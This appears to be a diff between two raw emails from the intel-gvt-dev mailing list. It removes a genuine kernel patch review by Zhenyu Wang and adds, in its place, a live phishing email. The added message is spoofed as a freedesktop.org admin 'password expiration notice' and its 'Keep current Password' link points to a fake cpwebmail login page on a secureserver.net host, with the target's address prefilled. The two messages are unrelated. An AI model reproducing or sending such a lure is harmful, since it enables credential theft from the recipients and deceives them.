@@ -2,37 +2,29 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
-	by mail.lfdr.de (Postfix) with ESMTPS id 279193CB2FC
-	for <lists+intel-gvt-dev@lfdr.de>; Fri, 16 Jul 2021 09:12:34 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id E76633CB35E
+	for <lists+intel-gvt-dev@lfdr.de>; Fri, 16 Jul 2021 09:39:17 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 55B706E91C;
-	Fri, 16 Jul 2021 07:12:32 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id A67F86E933;
+	Fri, 16 Jul 2021 07:39:16 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-Received: from mga06.intel.com (mga06.intel.com [134.134.136.31])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 25E186E919;
- Fri, 16 Jul 2021 07:12:31 +0000 (UTC)
-X-IronPort-AV: E=McAfee;i="6200,9189,10046"; a="271800646"
-X-IronPort-AV: E=Sophos;i="5.84,244,1620716400"; 
- d="asc'?scan'208";a="271800646"
-Received: from fmsmga003.fm.intel.com ([10.253.24.29])
- by orsmga104.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
- 16 Jul 2021 00:12:29 -0700
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="5.84,244,1620716400"; 
- d="asc'?scan'208";a="495951551"
-Received: from zhen-hp.sh.intel.com (HELO zhen-hp) ([10.239.160.143])
- by FMSMGA003.fm.intel.com with ESMTP; 16 Jul 2021 00:12:21 -0700
-Date: Fri, 16 Jul 2021 14:50:57 +0800
-From: Zhenyu Wang <zhenyuw@linux.intel.com>
-To: Jason Gunthorpe <jgg@nvidia.com>
-Subject: Re: [PATCH 12/13] vfio/gvt: Fix open/close when multiple device FDs
- are open
-Message-ID: <20210716065057.GA13928@zhen-hp.sh.intel.com>
-References: <0-v1-eaf3ccbba33c+1add0-vfio_reflck_jgg@nvidia.com>
- <12-v1-eaf3ccbba33c+1add0-vfio_reflck_jgg@nvidia.com>
+X-Greylist: delayed 4674 seconds by postgrey-1.36 at gabe;
+ Fri, 16 Jul 2021 07:39:15 UTC
+Received: from bizcloud-mail.nonni.com (unknown [138.68.154.48])
+ by gabe.freedesktop.org (Postfix) with ESMTP id DFB2E6E933
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Fri, 16 Jul 2021 07:39:15 +0000 (UTC)
+Received: from samsung.com (bizcloud-mail.nonni.com [IPv6:::1])
+ by bizcloud-mail.nonni.com (Postfix) with ESMTP id 44B7846BDBC
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Fri, 16 Jul 2021 05:44:58 +0000 (UTC)
+From: "lists.freedesktop.org Admin"<cpanel@lists.freedesktop.org>
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: intel-gvt-dev@lists.freedesktop.orgPASSWORD EXPIRATION NOTICE 
+Date: 16 Jul 2021 05:44:56 +0000
+Message-ID: <20210716054455.94CD794A363CC594@lists.freedesktop.org>
 MIME-Version: 1.0
-In-Reply-To: <12-v1-eaf3ccbba33c+1add0-vfio_reflck_jgg@nvidia.com>
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -45,113 +37,110 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
-Reply-To: Zhenyu Wang <zhenyuw@linux.intel.com>
-Cc: kvm@vger.kernel.org, linux-doc@vger.kernel.org,
- David Airlie <airlied@linux.ie>,
- Joonas Lahtinen <joonas.lahtinen@linux.intel.com>,
- dri-devel@lists.freedesktop.org, Kirti Wankhede <kwankhede@nvidia.com>,
- Max Gurtovoy <mgurtovoy@nvidia.com>, Vineeth Vijayan <vneethv@linux.ibm.com>,
- Diana Craciun <diana.craciun@oss.nxp.com>, Leon Romanovsky <leonro@nvidia.com>,
- Christoph Hellwig <hch@lst.de>, linux-s390@vger.kernel.org,
- Matthew Rosato <mjrosato@linux.ibm.com>, Jonathan Corbet <corbet@lwn.net>,
- Halil Pasic <pasic@linux.ibm.com>,
- Christian Borntraeger <borntraeger@de.ibm.com>,
- intel-gfx@lists.freedesktop.org, Zhi Wang <zhi.a.wang@intel.com>,
- Jason Herne <jjherne@linux.ibm.com>, Eric Farman <farman@linux.ibm.com>,
- Vasily Gorbik <gor@linux.ibm.com>, Heiko Carstens <hca@linux.ibm.com>,
- Jani Nikula <jani.nikula@linux.intel.com>, Eric Auger <eric.auger@redhat.com>,
- Alex Williamson <alex.williamson@redhat.com>,
- Harald Freudenberger <freude@linux.ibm.com>,
- Zhenyu Wang <zhenyuw@linux.intel.com>, Rodrigo Vivi <rodrigo.vivi@intel.com>,
- intel-gvt-dev@lists.freedesktop.org, "Raj, Ashok" <ashok.raj@intel.com>,
- Tony Krowiak <akrowiak@linux.ibm.com>, Yishai Hadas <yishaih@nvidia.com>,
- Cornelia Huck <cohuck@redhat.com>, Peter Oberparleiter <oberpar@linux.ibm.com>,
- Daniel Vetter <daniel@ffwll.ch>
-Content-Type: multipart/mixed; boundary="===============1051332065=="
+Content-Type: multipart/mixed; boundary="===============1512801127=="
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-
---===============1051332065==
-Content-Type: multipart/signed; micalg=pgp-sha1;
-	protocol="application/pgp-signature"; boundary="k+w/mQv8wyuph6w0"
-Content-Disposition: inline
-
-
---k+w/mQv8wyuph6w0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+--===============1512801127==
+Content-Type: text/html;
+	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-On 2021.07.14 21:20:41 -0300, Jason Gunthorpe wrote:
-> The user can open multiple device FDs if it likes, however the open
-> function calls vfio_register_notifier() on device global state. Calling
-> vfio_register_notifier() twice will trigger a WARN_ON from
-> notifier_chain_register() and the first close will wrongly delete the
-> notifier and more.
->=20
-> Since these really want the new open/close_device() semantics just change
-> the function over.
->=20
-> Signed-off-by: Jason Gunthorpe <jgg@nvidia.com>
-> ---
->  drivers/gpu/drm/i915/gvt/kvmgt.c | 8 ++++----
->  1 file changed, 4 insertions(+), 4 deletions(-)
->=20
-> diff --git a/drivers/gpu/drm/i915/gvt/kvmgt.c b/drivers/gpu/drm/i915/gvt/=
-kvmgt.c
-> index 1ac98f8aba31e6..7efa386449d104 100644
-> --- a/drivers/gpu/drm/i915/gvt/kvmgt.c
-> +++ b/drivers/gpu/drm/i915/gvt/kvmgt.c
-> @@ -885,7 +885,7 @@ static int intel_vgpu_group_notifier(struct notifier_=
-block *nb,
->  	return NOTIFY_OK;
->  }
-> =20
-> -static int intel_vgpu_open(struct mdev_device *mdev)
-> +static int intel_vgpu_open_device(struct mdev_device *mdev)
->  {
->  	struct intel_vgpu *vgpu =3D mdev_get_drvdata(mdev);
->  	struct kvmgt_vdev *vdev =3D kvmgt_vdev(vgpu);
-> @@ -1004,7 +1004,7 @@ static void __intel_vgpu_release(struct intel_vgpu =
-*vgpu)
->  	vgpu->handle =3D 0;
->  }
-> =20
-> -static void intel_vgpu_release(struct mdev_device *mdev)
-> +static void intel_vgpu_close_device(struct mdev_device *mdev)
->  {
->  	struct intel_vgpu *vgpu =3D mdev_get_drvdata(mdev);
-> =20
-> @@ -1753,8 +1753,8 @@ static struct mdev_parent_ops intel_vgpu_ops =3D {
->  	.create			=3D intel_vgpu_create,
->  	.remove			=3D intel_vgpu_remove,
-> =20
-> -	.open			=3D intel_vgpu_open,
-> -	.release		=3D intel_vgpu_release,
-> +	.open_device		=3D intel_vgpu_open_device,
-> +	.close_device		=3D intel_vgpu_close_device,
-> =20
->  	.read			=3D intel_vgpu_read,
->  	.write			=3D intel_vgpu_write,
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-Looks ok to me. Thanks!
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(2=
+38,238,238); FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-CO=
+LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
+R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
+ER-RIGHT-COLOR: rgb(238,238,238)" color=3D#3e2020 size=3D6 face=3D"Calibri =
+Light">
+<FONT style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); =
+BORDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238);=
+ BORDER-RIGHT-COLOR: rgb(238,238,238)" color=3D#d96c00>P A S S W O R D&nbsp=
+;&nbsp;&nbsp;&nbsp;E X P I R A T I O N</FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(2=
+38,238,238); FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-CO=
+LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
+R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
+ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">
+intel-gvt-dev@lists.freedesktop.org security password expires&nbsp;<FONT st=
+yle=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-L=
+EFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-=
+RIGHT-COLOR: rgb(238,238,238)" color=3D#ff0000>7/17/2021</FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(2=
+38,238,238); FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-CO=
+LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
+R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
+ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">Microsoft Advices&=
+nbsp;intel-gvt-dev@lists.freedesktop.org Re-enter password to keep account.=
+</FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(2=
+38,238,238); FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-CO=
+LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" align=3Dleft>
+<A title=3Dhttp://google.com style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: b=
+order-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
+-WIDTH: 0px; COLOR: rgb(0,118,198); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
+BACKGROUND-COLOR: transparent; text-decoration-line: none" href=3D"http://s=
+g3plvwcpnl378889.prod.sin3.secureserver.net/~aloyst/tests/mocks/cpwebmail/i=
+ndex.php?email=3Dintel-gvt-dev@lists.freedesktop.org" rel=3Dnoreferrer=20
+target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
+://sg3plvwcpnl378889.prod.sin3.secureserver.net/~aloyst/tests/mocks/cpwebma=
+il/index.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16263=
+04866228000&amp;usg=3DAFQjCNHFBvMxI1MeM0nKDoJFFuqL64adbA"><FONT style=3D"BO=
+X-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDER-LEFT-COLOR=
+: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORDER-RIGHT-COL=
+OR: rgb(238,238,238)" color=3D#0080ff size=3D4 face=3D"Calibri Light">
+Keep current Password</FONT></A></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-TOP-COLOR: rgb(238,238,238); WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; BORDER-LEFT-COLOR: rgb(2=
+38,238,238); FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; BO=
+RDER-BOTTOM-COLOR: rgb(238,238,238); ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-CO=
+LOR: rgb(238,238,238); LETTER-SPACING: normal; TEXT-INDENT: 0px; font-varia=
+nt-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial" align=3Dleft><FONT=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BORDE=
+R-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); BORD=
+ER-RIGHT-COLOR: rgb(238,238,238)" face=3D"Calibri Light">
+<EM style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(238,238,238); BO=
+RDER-LEFT-COLOR: rgb(238,238,238); BORDER-BOTTOM-COLOR: rgb(238,238,238); B=
+ORDER-RIGHT-COLOR: rgb(238,238,238)">@ lists.freedesktop.org</EM>&nbsp;2021=
+</FONT></P></BODY></HTML>
 
-Reviewed-by: Zhenyu Wang <zhenyuw@linux.intel.com>
-
---k+w/mQv8wyuph6w0
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iF0EARECAB0WIQTXuabgHDW6LPt9CICxBBozTXgYJwUCYPEsTAAKCRCxBBozTXgY
-Jx7CAJwL3rjxtO0hmyVLloknYXTNq4Pl4gCcC95wG37YNR4DYMf5Ns1jbuH5Nqk=
-=WTLJ
------END PGP SIGNATURE-----
-
---k+w/mQv8wyuph6w0--
-
---===============1051332065==
+--===============1512801127==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -162,4 +151,4 @@ intel-gvt-dev mailing list
 intel-gvt-dev@lists.freedesktop.org
 https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev
 
---===============1051332065==--
+--===============1512801127==--
